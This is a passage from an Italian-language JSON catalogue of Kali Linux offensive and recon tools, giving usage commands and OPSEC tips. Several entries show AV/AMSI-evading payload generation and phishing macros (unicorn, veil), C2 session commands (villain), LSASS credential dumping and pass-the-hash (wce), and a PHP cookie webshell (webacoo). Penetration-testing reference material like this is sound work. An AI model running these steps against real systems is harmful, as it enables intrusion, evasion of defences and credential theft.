    "repo": "https://www.kali.org/tools/unicorn-magic/",
    "desc": "Genera payload PowerShell per injection diretta in memoria con bypass AMSI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Unicorn è uno strumento per generare payload PowerShell che iniettano shellcode direttamente in memoria. Include tecniche di bypass AMSI e offuscamento per evadere AV e EDR durante operazioni red team.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Memory Injection:</strong> shellcode direttamente in memoria</p><p><strong>AMSI Bypass:</strong> tecniche per evitare Antimalware Scan Interface</p><p><strong>Multiple Payloads:</strong> Meterpreter, Cobalt Strike, custom</p><p><strong>Obfuscation:</strong> varie tecniche di offuscamento</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera payload Meterpreter reverse\npython unicorn.py windows/meterpreter/reverse_https LHOST LPORT\n\n# Macro per Office\npython unicorn.py windows/meterpreter/reverse_https LHOST LPORT macro\n\n# HTA payload\npython unicorn.py windows/meterpreter/reverse_https LHOST LPORT hta\n\n# Con Cobalt Strike\npython unicorn.py cobalt_strike.cs cs</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team</strong>, genera payload evasivi per initial access. Per <strong>phishing</strong>, crea macro Office malevole. Per <strong>AV bypass</strong>, evade detection con memory injection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> tecniche note possono essere rilevate. <strong>AMSI:</strong> bypass AMSI sono costantemente aggiornati. <strong>EDR:</strong> behavioral detection può rilevare injection.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "unicornscan",
    "name": "unicornscan",
    "version": "0.4.7",
    "icon": "../app/icons/unicornscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unicornscan/",
    "desc": "Port scanner asincrono userland per scansioni massive con rate elevati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Unicornscan è un port scanner asincrono userland progettato per scansioni massive ad alta velocità. Separa il sending dal receiving permettendo rate elevati senza perdita di accuratezza.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Asynchronous:</strong> sending/receiving separati per performance</p><p><strong>High Speed:</strong> rate fino a centinaia di kpps</p><p><strong>TCP/UDP:</strong> supporta entrambi i protocolli</p><p><strong>OS Fingerprinting:</strong> detection stack TCP/IP</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan TCP tutte le porte\nunicornscan -mT -Iv 192.168.1.0/24:a\n\n# Con rate specifico\nunicornscan -mT -r 10000 192.168.1.0/24:1-1024\n\n# Scan UDP\nunicornscan -mU 192.168.1.100:1-65535\n\n# OS fingerprinting\nunicornscan -mT -Iv -r 500 192.168.1.100:a</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>large-scale scanning</strong>, scansiona grandi range IP rapidamente. Per <strong>asset discovery</strong>, mappa porte aperte in reti estese. Per <strong>pentest</strong>, enumeration veloce di target multipli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noise:</strong> scan ad alto rate sono molto rumorosi. <strong>Detection:</strong> IDS rilevano facilmente scan aggressivi. <strong>Bandwidth:</strong> può saturare connessioni limitate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "uniscan",
    "name": "uniscan",
    "version": "6.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/uniscan/",
    "desc": "Scanner web per LFI, RFI, XSS, SQL injection con crawling automatico del sito.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Uniscan è uno scanner web che combina crawling automatico con vulnerability testing. Cerca vulnerabilità comuni come LFI, RFI, XSS e SQL injection analizzando automaticamente le pagine del sito.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Crawling:</strong> esplora automaticamente il sito</p><p><strong>Vulnerability Scanning:</strong> LFI, RFI, XSS, SQLi</p><p><strong>Fingerprinting:</strong> identifica tecnologie web</p><p><strong>Directory Enumeration:</strong> bruteforce directory comuni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo\nuniscan -u http://target.com/ -qweds\n\n# Solo vulnerability check\nuniscan -u http://target.com/ -d\n\n# Directory bruteforce\nuniscan -u http://target.com/ -w\n\n# Scan statico\nuniscan -u http://target.com/ -e\n\n# Dynamic tests\nuniscan -u http://target.com/ -s</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web assessment</strong>, scan rapido vulnerabilità web. Per <strong>enumeration</strong>, scopre directory e file nascosti. Per <strong>pentest</strong>, identifica punti di attacco applicazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noise:</strong> genera molto traffico HTTP. <strong>Logging:</strong> tutte le richieste loggabili. <strong>WAF:</strong> pattern injection facilmente bloccati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "unix-privesc-check",
    "name": "unix-privesc-check",
    "version": "1.4",
    "icon": "../app/icons/unix-privesc-check-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/unix-privesc-check/",
    "desc": "Script per trovare misconfiguration di privilege escalation su sistemi Unix/Linux.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Unix-privesc-check è uno script che analizza sistemi Unix/Linux alla ricerca di misconfiguration che permettono privilege escalation. Controlla permessi file, SUID, capabilities, sudo e altre potenziali vie di escalation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>File Permissions:</strong> trova file/directory world-writable</p><p><strong>SUID/SGID:</strong> identifica binari con bit setuid</p><p><strong>Sudo Rules:</strong> analizza configurazione sudoers</p><p><strong>Cron Jobs:</strong> controlla script eseguiti da root</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Check standard\nunix-privesc-check standard\n\n# Check dettagliato\nunix-privesc-check detailed\n\n# Output su file\nunix-privesc-check standard > privesc_report.txt\n\n# Solo SUID check\nunix-privesc-check standard | grep -i suid</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>post-exploitation</strong>, trova vie per escalare a root. Per <strong>security audit</strong>, identifica misconfiguration. Per <strong>hardening</strong>, verifica configurazione sicura.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> accessi a file possono essere loggati. <strong>Time:</strong> scan completo può richiedere tempo. <strong>Noise:</strong> molti accessi filesystem sono visibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "repocrazy",
    "name": "repocrazy",
    "version": "0.7.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/repocrazy/",
    "desc": "Cerca informazioni sensibili nei repository Debian e Ubuntu pubblicati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Repocrazy è uno strumento per cercare informazioni sensibili nei repository Debian e Ubuntu pubblici. Analizza pacchetti .deb alla ricerca di credenziali, chiavi API, e altri secrets inclusi accidentalmente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Package Analysis:</strong> scarica e analizza pacchetti .deb</p><p><strong>Secret Detection:</strong> cerca password, chiavi, token</p><p><strong>Multiple Repos:</strong> supporta repository custom</p><p><strong>Regex Patterns:</strong> pattern configurabili per detection</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analizza repository Ubuntu\nrepocrazy --repo http://archive.ubuntu.com/ubuntu\n\n# Repository custom\nrepocrazy --repo http://custom.repo.com/debian\n\n# Solo pacchetti specifici\nrepocrazy --repo http://repo.com --package mypackage\n\n# Output JSON\nrepocrazy --repo http://repo.com --json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>security research</strong>, trova secrets in pacchetti pubblici. Per <strong>supply chain audit</strong>, verifica sicurezza dipendenze. Per <strong>bug bounty</strong>, cerca credenziali esposte.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Bandwidth:</strong> download pacchetti richiede banda. <strong>Storage:</strong> analisi richiede spazio temporaneo. <strong>Responsible Disclosure:</strong> segnalare secrets trovati ai maintainer.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "veil",
    "name": "veil",
    "version": "3.1.14",
    "icon": "../app/icons/veil-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/veil/",
    "desc": "Framework per generare payload con evasion AV: Python, PowerShell, C, Go.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Veil è un framework per generare payload con evasion antivirus. Include Veil-Evasion per payload standalone e Veil-Ordnance per shellcode, con supporto per Python, PowerShell, C, Go e altri linguaggi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Language:</strong> payload in Python, PowerShell, C, Go, Ruby</p><p><strong>Encryption:</strong> vari metodi di cifratura payload</p><p><strong>Obfuscation:</strong> tecniche multiple di offuscamento</p><p><strong>Shellcode Generation:</strong> con Veil-Ordnance</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Veil\nveil\n\n# Lista payload disponibili\nuse Evasion\nlist\n\n# Genera payload Python\nuse python/meterpreter/rev_tcp\nset LHOST 192.168.1.100\nset LPORT 4444\ngenerate\n\n# PowerShell payload\nuse powershell/meterpreter/rev_tcp\ngenerate</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team</strong>, genera payload che evadono AV. Per <strong>phishing</strong>, crea eseguibili che passano controlli. Per <strong>pentest</strong>, testa efficacia AV aziendale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> payload Veil noti possono essere rilevati. <strong>Heuristics:</strong> AV moderni usano behavioral analysis. <strong>Updates:</strong> aggiornare regolarmente per nuove tecniche.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "villain",
    "name": "villain",
    "version": "2.2.1",
    "icon": "../app/icons/villain-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/villain/",
    "desc": "Framework C2 Windows con agent multi-hop, evasion e gestione sessioni avanzata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Villain è un framework C2 Windows-focused con agent multi-hop e capacità di evasion. Genera payload PowerShell e Python con cifratura, supporta pivoting e offre gestione avanzata delle sessioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Hop:</strong> routing attraverso catene di host</p><p><strong>Encrypted Comms:</strong> traffico cifrato AES</p><p><strong>Payload Types:</strong> PowerShell, Python, cmd stagers</p><p><strong>Session Management:</strong> gestione multipla sessioni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Villain\nvillain\n\n# Genera payload PowerShell\ngenerate -t windows/powershell_reverse_tcp -p 4444\n\n# Lista sessioni\nsessions\n\n# Interagisci con sessione\nsession 1\n\n# Comandi sulla sessione\nexec whoami\nupload local.exe C:\\\\Temp\\\\remote.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team</strong>, gestisce operazioni C2 su Windows. Per <strong>pivoting</strong>, naviga reti interne via multi-hop. Per <strong>persistence</strong>, mantiene accesso a lungo termine.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> pattern di traffico analizzabili. <strong>Signatures:</strong> stager possono essere rilevati. <strong>EDR:</strong> behavioral detection può identificare attività sospetta.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "voiphopper",
    "name": "voiphopper",
    "version": "2.04",
    "icon": "../app/icons/voiphopper-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/voiphopper/",
    "desc": "VLAN hopping su telefoni VoIP per accedere a VLAN voce da rete dati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>VoIPhopper è uno strumento per VLAN hopping che emula il comportamento di telefoni VoIP per ottenere accesso alla Voice VLAN da una rete dati standard. Sfrutta protocolli di discovery come CDP, DHCP e LLDP-MED per identificare e saltare nella VLAN voce isolata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CDP/LLDP Discovery:</strong> identifica automaticamente Voice VLAN tramite Cisco Discovery Protocol e LLDP-MED</p><p><strong>VLAN Tagging:</strong> configura interfaccia per 802.1Q tagging e accesso alla Voice VLAN</p><p><strong>Phone Emulation:</strong> impersona telefono VoIP per bypassare controlli di accesso basati su dispositivo</p><p><strong>Multi-vendor:</strong> supporta ambienti Cisco, Avaya, Nortel e altri vendor VoIP</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scopri Voice VLAN via CDP e hop automatico\nvoiphopper -i eth0 -c -a\n\n# Hop manuale a VLAN 100 con MAC spoofing\nvoiphopper -i eth0 -v 100 -m 00:1E:7A:XX:XX:XX\n\n# Workflow completo: discovery + hop + scan\nvoiphopper -i eth0 -c -a &amp;&amp; \\\n  nmap -sV -p 5060,5061 --script=sip-enum-users 10.100.0.0/24\n\n# LLDP-MED per ambienti non-Cisco\nvoiphopper -i eth0 -l -a\n\n# Cattura traffico VoIP post-hop\nvoiphopper -i eth0 -v 100 &amp;&amp; \\\n  tcpdump -i eth0.100 -w voip_capture.pcap port 5060 or portrange 10000-20000</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Segmentation Testing</strong>, verificare isolamento tra VLAN dati e voce. Per <strong>VoIP Security Assessment</strong>, testare protezioni contro accesso non autorizzato a infrastruttura voce. Per <strong>Lateral Movement</strong>, accedere a reti VoIP isolate durante penetration test.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> CDP/LLDP discovery genera traffico anomalo rilevabile da network monitoring. Switch con port security e dynamic ARP inspection possono bloccare l'attacco. MAC address cloning di telefoni è tracciabile nei log.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "wafw00f",
    "name": "wafw00f",
    "version": "2.3.1",
    "icon": "../app/icons/wafw00f-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wafw00f/",
    "desc": "Rileva WAF (Web Application Firewall) analizzando risposte HTTP e behavior.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WAFW00F è uno strumento di fingerprinting che identifica Web Application Firewall analizzando le risposte HTTP e i pattern comportamentali. Riconosce oltre 150 WAF diversi tramite signature delle risposte, codici di errore e header specifici dei vendor.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WAF Detection:</strong> identifica 150+ WAF commerciali e open source tramite fingerprinting</p><p><strong>Aggressive Mode:</strong> modalità intensiva che invia payload malevoli per triggare risposte WAF</p><p><strong>Generic Detection:</strong> rileva WAF sconosciuti analizzando anomalie comportamentali</p><p><strong>Proxy Support:</strong> supporto per Tor e proxy HTTP per scansioni anonime</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Detection WAF con output JSON per automazione\nwafw00f https://target.com -o waf_results.json -f json\n\n# Scansione aggressiva via proxy Burp\nwafw00f -a https://target.com -p http://127.0.0.1:8080\n\n# Scansione bulk da lista target\ncat targets.txt | while read url; do wafw00f \"$url\" -o \"waf_$(echo $url | md5sum | cut -d' ' -f1).json\" -f json; done\n\n# Pipeline con nuclei per testare bypass\nwafw00f https://target.com -v &amp;&amp; \\\n  nuclei -u https://target.com -t waf-bypass/ -proxy http://127.0.0.1:8080\n\n# Custom User-Agent per evasione\nwafw00f https://target.com -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64)\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Pre-Engagement Recon</strong>, identificare protezioni WAF prima di testare applicazioni web. Per <strong>Bypass Strategy</strong>, selezionare tecniche di evasione appropriate al WAF rilevato. Per <strong>Security Assessment</strong>, verificare corretta implementazione e visibilità WAF.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> request anomale per fingerprinting sono loggate dai WAF. Modalità aggressiva genera alert immediati. User-Agent wafw00f è signature nota. Usare proxy e randomizzare timing per ridurre fingerprint.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "WAF"
    ],
    "notes": null
  },
  {
    "id": "wapiti",
    "name": "wapiti",
    "version": "3.0.4",
    "icon": "../app/icons/wapiti-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wapiti/",
    "desc": "Scanner black-box per vulnerabilità web: XSS, SQLi, XXE, SSRF con crawling.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Wapiti è uno scanner di vulnerabilità web black-box che analizza applicazioni tramite crawling automatico e injection di payload malevoli. Rileva XSS, SQL injection, XXE, SSRF, command injection, CRLF, path traversal e molte altre vulnerabilità senza accesso al codice sorgente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Vulnerability Classes:</strong> rileva 15+ classi di vulnerabilità web incluse OWASP Top 10</p><p><strong>Smart Crawling:</strong> spider intelligente con gestione form, JavaScript e autenticazione</p><p><strong>Module System:</strong> moduli specializzati per ogni tipo di vulnerabilità attivabili selettivamente</p><p><strong>Report Generation:</strong> report HTML, JSON, XML con dettagli su vulnerabilità trovate</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione completa con report HTML e scope limitato\nwapiti -u https://target.com -f html -o report.html --max-scan-time 3600\n\n# Autenticazione bearer token per API\nwapiti -u https://api.target.com -H \"Authorization: Bearer eyJhbG...\" -m sql,xxe,ssrf\n\n# Scansione con cookie di sessione (post-login)\nwapiti -u https://target.com -c \"PHPSESSID=abc123; auth=xyz789\" --scope folder\n\n# Escludere logout e profilo, profondità limitata\nwapiti -u https://target.com -x \"logout|signout|profile|account\" -d 3 --max-links 500\n\n# Pipeline CI/CD con threshold di vulnerabilità\nwapiti -u https://staging.target.com -f json -o results.json &amp;&amp; \\\n  jq '.vulnerabilities | length' results.json | \\\n  xargs -I {} sh -c '[ {} -gt 0 ] &amp;&amp; exit 1 || exit 0'\n\n# Proxy attraverso Burp per analisi manuale\nwapiti -u https://target.com -p http://127.0.0.1:8080 --verify-ssl 0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Security Assessment</strong>, scansione automatizzata di applicazioni web per vulnerabilità note. Per <strong>Compliance Testing</strong>, verifica OWASP Top 10 e requisiti di sicurezza. Per <strong>CI/CD Integration</strong>, scanning automatico in pipeline di deployment.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> genera traffico anomalo con pattern di attacco riconoscibili. WAF e IDS rilevano facilmente injection attempts. Molte request possono causare rate limiting. Usare scope limitato e throttling per ridurre impatto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "watobo",
    "name": "watobo",
    "version": "1.0.1",
    "icon": "../app/icons/watobo-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/watobo/",
    "desc": "Web proxy con audit automatico per test applicazioni web e API REST.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Watobo è un proxy intercettante con capacità di auditing automatico per testare applicazioni web e API REST. Combina funzionalità di proxy manuale con scanner automatizzati per identificare vulnerabilità comuni durante l'interazione con l'applicazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Proxy Intercept:</strong> cattura e modifica request/response HTTP in tempo reale</p><p><strong>Passive Analysis:</strong> analisi automatica del traffico per identificare pattern vulnerabili</p><p><strong>Active Checks:</strong> test attivi per XSS, SQLi e altre vulnerabilità injection</p><p><strong>Session Management:</strong> gestione sessioni e cookie per testing autenticato</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Watobo\nwatobo\n\n# Configura browser proxy\n# localhost:8080\n\n# Naviga applicazione target\n# per popolare site map</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Manual Testing</strong>, analisi dettagliata di funzionalità specifiche con intercept manuale. Per <strong>API Testing</strong>, test di endpoint REST con manipolazione parametri. Per <strong>Hybrid Assessment</strong>, combinare scansione automatica con test manuali mirati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> richieste modificate possono contenere pattern riconoscibili. Scanning automatico genera traffico anomalo. Certificato proxy custom può essere rilevato. Usare in ambiente controllato con autorizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "waybackpy",
    "name": "waybackpy",
    "version": "3.0.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/waybackpy/",
    "desc": "Client Python Wayback Machine per recuperare snapshot storici di siti web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Waybackpy è un client Python per interagire con Wayback Machine di Internet Archive. Permette di recuperare snapshot storici di siti web, salvare nuove versioni e cercare URL archiviati per OSINT e analisi della storia di un target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Archive Retrieval:</strong> recupera versioni storiche di pagine web dall'archivio</p><p><strong>Save Pages:</strong> salva nuovi snapshot di pagine su Wayback Machine</p><p><strong>CDX API:</strong> cerca tutti gli snapshot disponibili per un URL con metadata</p><p><strong>Python Library:</strong> integrabile in script Python per automazione OSINT</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Ottieni ultimo snapshot\nwaybackpy --url https://target.com --oldest\n\n# Cerca tutti gli snapshot\nwaybackpy --url https://target.com --known_urls\n\n# Salva pagina su archive\nwaybackpy --url https://target.com --save\n\n# Python API\nfrom waybackpy import WaybackMachineAvailabilityAPI</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Historical OSINT</strong>, recuperare versioni precedenti di siti per identificare informazioni rimosse. Per <strong>Subdomain Discovery</strong>, trovare sottodomini storici non più attivi. Per <strong>Credential Hunting</strong>, cercare configurazioni esposte in versioni passate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> query a Wayback Machine sono passive e non raggiungono il target direttamente. Le richieste sono loggate da Internet Archive. Rate limiting può essere applicato per query intensive.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "wce",
    "name": "wce",
    "version": "1.42",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wce/",
    "desc": "Windows Credentials Editor: dump hash, pass-the-hash, token impersonation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WCE (Windows Credentials Editor) è uno strumento per manipolare credenziali Windows in memoria. Permette di estrarre hash NTLM, eseguire pass-the-hash, listare sessioni logon e impersonare token di sicurezza per privilege escalation e lateral movement.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Hash Dump:</strong> estrae hash NTLM e password in chiaro dalla memoria LSASS</p><p><strong>Pass-the-Hash:</strong> autentica con hash NTLM senza conoscere la password</p><p><strong>Token Manipulation:</strong> lista e impersona token di sicurezza di altri utenti</p><p><strong>Session Listing:</strong> enumera sessioni logon attive con dettagli credenziali</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump credenziali con WDigest cleartext\nwce.exe -w -v\n\n# Pass-the-Hash per aprire cmd come altro utente\nwce.exe -s Administrator:DOMAIN:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\ncmd.exe /c \"whoami &amp;&amp; net user\"\n\n# Refresh credenziali in sessione corrente\nwce.exe -r\n\n# Dump e salvataggio per cracking offline\nwce.exe -l -o creds_dump.txt\nhashcat -m 1000 creds_dump.txt rockyou.txt\n\n# Lista token e impersona SYSTEM\nwce.exe -e\nwce.exe -i -s NT AUTHORITY\\SYSTEM\n\n# PTH per PsExec remoto\nwce.exe -s admin:CORP:hash:hash &amp;&amp; \\\n  psexec.exe \\\\targetpc cmd.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Credential Harvesting</strong>, estrarre credenziali da sistemi compromessi. Per <strong>Lateral Movement</strong>, usare hash per accedere ad altri sistemi nel dominio. Per <strong>Privilege Escalation</strong>, impersonare token di utenti privilegiati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> accesso a LSASS è monitorato da EDR e genera eventi Sysmon. WCE è signature nota per tutti gli antivirus. NTLM pass-the-hash lascia tracce nei log di sicurezza. Preferire alternative moderne come Mimikatz con offuscamento.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "web-cache-vulnerability-scanner",
    "name": "web-cache-vulnerability-scanner",
    "version": "1.4.3",
    "icon": "../app/icons/web-cache-vulnerability-scanner-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/web-cache-vulnerability-scanner/",
    "desc": "Rileva vulnerabilità web cache poisoning e deception per attacchi su CDN e proxy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Web Cache Vulnerability Scanner è uno strumento specializzato per identificare vulnerabilità di web cache poisoning e cache deception. Testa CDN, reverse proxy e sistemi di caching per trovare configurazioni che permettono di avvelenare cache o rubare dati di altri utenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cache Poisoning:</strong> identifica header e parametri che permettono di avvelenare la cache</p><p><strong>Cache Deception:</strong> trova path che espongono dati sensibili di altri utenti via cache</p><p><strong>Key Detection:</strong> analizza quali elementi compongono la cache key</p><p><strong>Automated Testing:</strong> test automatici per varianti note di cache vulnerability</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione base\nweb-cache-vulnerability-scanner -u https://target.com\n\n# Test specifico per poisoning\nweb-cache-vulnerability-scanner -u https://target.com --poisoning\n\n# Con wordlist custom per path\nweb-cache-vulnerability-scanner -u https://target.com -w paths.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>CDN Security</strong>, verificare configurazione sicura di Cloudflare, Akamai e altri CDN. Per <strong>Cache Poisoning</strong>, testare possibilità di iniettare contenuto malevolo nella cache. Per <strong>Data Exposure</strong>, identificare cache deception che espone dati utente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> header anomali nei test sono loggati. Cache poisoning reale può impattare altri utenti. Test di deception possono esporre dati sensibili. Eseguire solo con autorizzazione esplicita.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "webacoo",
    "name": "webacoo",
    "version": "0.2.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/webacoo/",
    "desc": "Web backdoor cookie-based per comunicazione stealth con webshell via cookie HTTP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WeBaCoo (Web Backdoor Cookie) è un generatore di webshell stealth che nasconde comunicazioni nei cookie HTTP. I comandi vengono inviati tramite cookie encoded e le risposte tornano nello stesso modo, evitando detection basata su parametri URL o body delle request.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cookie Communication:</strong> canale di comando nascosto nei cookie HTTP</p><p><strong>Base64 Obfuscation:</strong> encoding dei comandi per evitare detection pattern-based</p><p><strong>PHP Backdoor:</strong> genera webshell PHP minimale e offuscata</p><p><strong>Terminal Mode:</strong> shell interattiva per eseguire comandi sul server</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera backdoor\nwebacoo -g -o backdoor.php\n\n# Connetti alla backdoor\nwebacoo -t -u http://target.com/backdoor.php\n\n# Specifica cookie name custom\nwebacoo -g -o backdoor.php -c CustomCookie</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Stealth Persistence</strong>, mantenere accesso con comunicazioni difficili da rilevare. Per <strong>WAF Bypass</strong>, evitare detection che analizza solo URL e body. Per <strong>Post-Exploitation</strong>, shell nascosta dopo upload iniziale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> cookie anomali possono essere analizzati da WAF avanzati. File PHP rimane sul filesystem e può essere trovato. Pattern base64 nei cookie sono signature riconoscibile. Usare encryption custom per 